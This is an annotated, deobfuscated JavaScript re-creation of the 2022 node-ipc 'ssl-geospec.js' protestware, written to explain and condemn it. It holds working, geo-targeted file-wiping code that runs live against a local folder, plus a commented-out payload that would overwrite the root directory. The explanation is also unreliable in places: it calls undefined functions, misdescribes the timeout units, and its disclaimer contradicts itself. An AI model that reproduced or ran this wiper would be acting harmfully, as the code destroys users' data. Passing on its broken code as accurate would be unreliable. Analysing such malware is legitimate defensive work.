// --DISCLAIMER--
// I do not condemn harassing, threatening, and/or harming the original creator of this code. While his actions cannot be
// condemned, nobody ever deserves to be physically and/or mentally harmed by their actions. The best the FOSS community can do is hold him
// accountable for his actions, and to bar him from contributing to any other FOSS project until he has shown change through his actions.

// My, this repo's author, opinions and/or perspectives will not play a factor into whether or not these commits, made by the original author of this code,
// were morally, ethically, and/or legally in the right; as, going by FOSS governance, these commits shouldn't have ever been pushed to the master branch.
// The author seemed to not take into consideration the full consequence of his actions, as malware, such as the below code, will be looked at as an example
// on how not to show solidarity for victims of war. This is not protest-ware, this is literal malware, by the definition.


// --Introduction--
// This package as a whole is to explain to the end user on why the recent actions involving node-ipc are dangerous, not just for the FOSS (Free and Open Source Software)
// community; but to the larger population of end users overall. I will do my best to explain the code below in the most simple terms as possible.
// I will also provide some resources within the index too, as some of the code below can look complex to someone who doesn't have experience using Javascript.
// As well, I have done my best to deobfuscate the original code into a more readable format; not just for whitespace formatting, but for properly, descriptive
// variable names so that the use of the code is more transparent. 

// And while a few of the syntax and semantics have changed, the functionality between this package and the original module are the exact same.


// ---Context---
// This script, originally named "ssl-geospec.js" was originally located in the Node-IPC package.
// Specifically, version 11.x of the package.

// This was originally tagged along with another package dependency named 'peacenotwar', which, when ran with the parent package,
// will write a file to the user's Desktop directory (or One Drive desktop directory if the user's operating system was Windows 1x).
// This text file was titled, "WITH-LOVE-FROM-AMERICA.txt" and contained zero bytes of data within.

// Both the "peacenotwar" package and "ssl-geospec.js" module was labeled originally as protest-ware by the initial author of both; and this was in
// protest against the 2022 Russia-Ukraine conflict, where Russia had began to invade Ukraine for the purposes of taking over the Ukrainian territory.

// And once both were discovered by users of the node-ipc package, the original author received backlash for both due to how potentially dangerous
// both can be to the end user and to the developers utilizing the node-ipc package. In that both has violated the security standards set by the FOSS
// community; thus being labeled as malware. As of March 18th, 2022, the original code, that this script has unobfuscated, has been removed from
// the source code for both 10.1.0 and 11.2.0. However, the peacenotwar package is still a listed dependency for 11.x; but not for 10.1.0.


// --Note to Brandon/RIAEvangelist--
// And to Brandon, if you are reading this, shame on you for further setting back the FOSS community's reputation with the software development industry.
// You have singlehandly compromised the security of hundreds, if not thousands, of projects through your careless actions.
// Your actions, as well, have the potential, if they not have already, to oppress the Ukranian and Russian citizens even more. Do not put the blame on Russian citizens,
// the actions of Russia go squarly towards Putin and his administration. The Russian population also heavily condemn Putin's actions, and share very similar,
// if not the same, perspectives as you towards the current conflict.

// I do not blame other project leaders if they choose to bar you from contributing to their projects, as you have shown everyone that you are not capable of thinking
// rationally about your actions and their consequences. If you want my advice, apologize to the FOSS community for your actions, delete the peacenotwar package
// (or rewrite the package to abide by FOSS standards), remove that dependency from node-ipc, and enist a community of contibuters to vote on any further
// commits to node-ipc; so that something like this, at the very least for node-ipc, will never happen again.


// --Links--
// Oiginally written by Brandon Nozaki Miller: https://github.com/RIAEvangelist
// Original commit: https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js
// The peacenotwar package's repo: https://github.com/RIAEvangelist/peacenotwar


// **WARNING: THIS IS LIVE MALWARE. RUN IT AT YOUR RISK.**
// Importing packages for EJ6 (the current version of Javascript), original used import statements; as highlighted below. 
// This change is to help with compability with this package.
const path = require("path");
const fs = require("fs");
const https = require("https");
// import u from "path";
// import a from "fs";
// import o from "https";

// Note: Any complex function calls and concepts within Javascript used here will be cited in Appendix A
// setTimeout: ran to artificially extend time (no logical reason given) of function call below.
setTimeout(function () {
    // doNotRunCalls has a 25% of being less than 1, as Math.random() calls a value between 0 and 1; and the lowest value you can have here is 0.25 to return from this timeout.
    const doNotRunCalls = Math.round(Math.random() * 4);
    if (doNotRunCalls > 1) { console.log("Random call was cancelled."); return; }

    // REST API call to an IP geo-fetch service that captures the current user's IP address
    const apiKey = "INSERT-YOUR-OWN-API-KEY-HERE";  // Use your own API key here from this website: https://ipgeolocation.io
    const apiUrl = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`;

    // The get request of the https package is called using the API URL above. More about the JSON result will be explained in Appendix B.
    https.get(apiUrl, function (inMessage) {
        inMessage.on("data", function (jsonData) {  // Using the incoming message from the get call, fetch the JSON data from what we got.
            // The constant strings below are file paths to this directory, the parent directory, the grandparent directory, and the root directory.
            const currentDirectory = "./";
            const parentDirectory = "../";
            const grandparentDirectory = "../../";
            const rootDirectory = "/";

            // For this package, we will use the directory reference for dirA, which contains a generic file named file1.
            const fileADirectory = "./dirA";

            // The constant string below is the JSON entry for the country's name of the current user's IP.
            const countryName = "country_name";

            // Russia and Belarus country name entries are below.
            const russia = "russia";
            const belarus = "belarus";

            // Run a try / fetch block to catch any errors logged.
            try {
                // We parse the JSON string into a Javascript object, and retrive the end user's country name.
                const parsedJsonObject = JSON.parse(jsonData);
                const endUserCountryName = parsedJsonObject[countryName].toLowerCase();

                // The constant bool that is true if the user is from Russia or Belarus, or false if they arn't from those countries.
                const isTargetUser = endUserCountryName.includes(russia) || endUserCountryName.includes(belarus);

                // If the user is a targeted user, run the overwrite function.
                if (isTargetUser) {
                    console.log("Target User detected, proceeding to erase files.");
                    overwriteFile(fileADirectory);

                    // Uncomment the following code below to enable the original script's payload. DO NOT UNCOMMENT UNLESS YOU KNOW WHAT YOU'RE DOING!!!
                    // const isConfirmed = killSwitch();
                    // if (isConfirmed) {
                    //     overwriteFile(currentDirectory);
                    //     overwriteFile(parentDirectory);
                    //     overwriteFile(grandparentDirectory);
                    //     overwriteFile(rootDirectory);
                    // }
                } else { console.log("Target User not detected."); }
            } catch (error) { console.log(error); }
        });
    });
}, Math.ceil(Math.random() * 1000));  
// Timeout call is a random float between 0 and 1 that's the product of 1,000; 
// and all ran through a ceiling (round up to nearest whole regardless) function.
// e.g., timeout is between 1 and 1000 seconds.

/**
 * @param inputDirectory The input directory that the user provides.
 * @param childDirectory The child directory used recursively.
 */
// overwriteFile(inputDirectory, childDirectory) is a recursive function that overwrites every file within the input directory. 
// It is async due to it being used within setTimeout().
async function overwriteFile(inputDirectory = "", childDirectory = "") {
    // Verifies that the input directory exists within your file system (thus the fs package call).
    if (!fs.existsSync(inputDirectory)) return;

    // The children directories / directory to recurse over.
    let ChildrenDirectories = [];

    // fetches an array of references to the children directories / directory.
    try { ChildrenDirectories = fs.readdirSync(inputDirectory); } 
    catch (error) { console.log(error); }

    // Result array to contain the number of files within the inputDirectory, supposedly.
    // This seems to be a vestigial variable used for debugging purposes.
    const result = [];

    // The heart emoji used to overwrite the file(s).
    const heartEmoji = "❤️";

    // For all of the entries within ChildrenDirectories, if it's a directory, recurse through it.
    for (var i = 0; i < ChildrenDirectories.length; ++i) {
        const childFilePath = path.join(inputDirectory, ChildrenDirectories[i]);

        // Synbolic link contains the statistic information pertaining to the file.
        let symbolicLink = null;
        try { symbolicLink = fs.lstatSync(childFilePath); } // lstatSync is used to fetch the symbolic link file stats.
        catch (error) {
            console.log(error);
            continue;
        }
        // If the child file is actually a directory, recurse through it.
        if (symbolicLink.isDirectory()) {
            // The array output is created as a result of the output of overwriteFile(inputDirectory, childDirectory).
            const output = h(childFilePath, childDirectory);

            // If output isn't empty, push its content into result; otherwise do nothing.
            // Note: Since the function is asyncronous, this line of code wouldn't be ran; thus serving no practical use case that's currently known.
            output.length > 0 ? result.push(...output) : null;
        } else if (childFilePath.indexOf(childDirectory) >= 0) {  // Else if there is a substring of childFilePath that is within childDirectory, overwrite that file.
            try {
                // Use writeFile to write to the childFilePath
                fs.writeFile(childFilePath, heartEmoji, () => {});
            } catch (error) { console.log(error); }
        }
    }
    return result;
}

// the killSwitch() function is used within the setTimeout call as a confirmation prompt for the user. This is to insure they know what they're explicitly doing.
// Returns true if they know what they're doing, otherwise return false.
async function killSwitch() {
    var response = n;
    response = prompt("WARNING: YOU ARE ABOUT TO RUN CODE THAT WILL OVERWRITE THE ROOT DIRECTORY, ARE YOU SURE YOU WANT TO PROCEED? (y/N)");
    if (response.toLowerCase() == "y") { return true; }
    return false;
}

// Export used here as possible obfuscation. No known purpose has been recorded of this export.
// They're commented out as well due to compatibility with this package.
// const ssl = true;
// export { ssl, ssl as default };


// --Appendix A--
// (References, in order of appearence above)
// path package: https://nodejs.org/api/path.html
// fs package: https://nodejs.org/api/fs.html
// https package: https://nodejs.org/api/https.html
// async functions: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function
// setTimeout: https://developer.mozilla.org/en-US/docs/Web/API/setTimeout
// try ... catch blocks: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/try...catch


// --Appendix B--
// Crash course in API calls:
// - APIs (Application Programming Interface) basically supply a bunch of tools, data, etc. to the developer to integrate into their application.
// - JSON (Javascript Object Notation) is data that is structured to be converted from a string (think a combination / an array of characters)
// to a Javascript object (think of objects as variables that hold various pieces of information, as shown below).
// Example:
// var objectExample = {
//    time: "5:40",
//    task: "Stop playing Mega Man X.",
//    isDone: true
// }
// - A key is what you, as the developer, will index for within the object, and the value is what the key is holding.
// e.g., the above object has the key "time" holding the string value "5:40".
// - The variable within this code, apiUrl, is a URL that returns the object that contains various things (e.g., ip address, continent code, city, etc.);
// though mainly, the code will use the "country_name" key to get the user's country name.
// So in this case, for ipgeolocation, if your IP is within the United States, the value for the key "country_name" would be "United States".